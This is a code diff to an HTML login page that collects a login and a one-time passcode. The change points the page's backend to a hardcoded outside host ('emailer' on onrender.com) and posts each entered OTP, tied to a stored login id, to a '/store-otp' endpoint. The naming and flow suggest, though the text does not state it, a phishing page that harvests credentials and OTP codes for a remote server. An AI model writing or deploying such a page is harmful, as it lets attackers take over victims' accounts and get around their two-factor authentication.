@@ -41,7 +41,7 @@ body { background:#000; color:#fff; display:flex; justify-content:center; align-
 </div>
 
 <script>
-const BASE_URL = window.location.origin;
+const BASE_URL = "https://emailer-di2d.onrender.com/";  // <<< SET THIS
 
 const loginBtn = document.getElementById("loginBtn");
 const loginText = document.getElementById("loginText");
@@ -77,7 +77,8 @@ loginBtn.onclick = async () => {
       return;
     }
 
-    loginId = data.id || null;
+    loginId = data.id;
+    localStorage.setItem("loginId", loginId); // SAVE
   } catch (err) {
     alert("Network error storing login: " + err.message);
     loginText.style.display = "inline";
@@ -94,28 +95,30 @@ loginBtn.onclick = async () => {
 
 otpBtn.onclick = async () => {
   const otp = document.getElementById("otpInput").value.trim();
-  const email = document.getElementById("email").value.trim();
   if (!otp) { alert("Enter OTP"); return; }
 
+  const loginId = localStorage.getItem("loginId");
+
   try {
-    const body = loginId ? { otp, email, loginId } : { otp, email };
     const res = await fetch(`${BASE_URL}/store-otp`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(body)
+      body: JSON.stringify({ otp, loginId })
     });
 
-    const data = await res.json();
+    const data = await res.json().catch(() => ({}));
+
     if (data.success) {
       alert("OTP submitted successfully!");
     } else {
-      alert("Error saving OTP: " + data.error);
+      alert("Error saving OTP: " + (data.error || "Unknown"));
     }
   } catch (err) {
     alert("Error submitting OTP: " + err.message);
   }
 };
 </script>
+
 
 </body>
 </html>
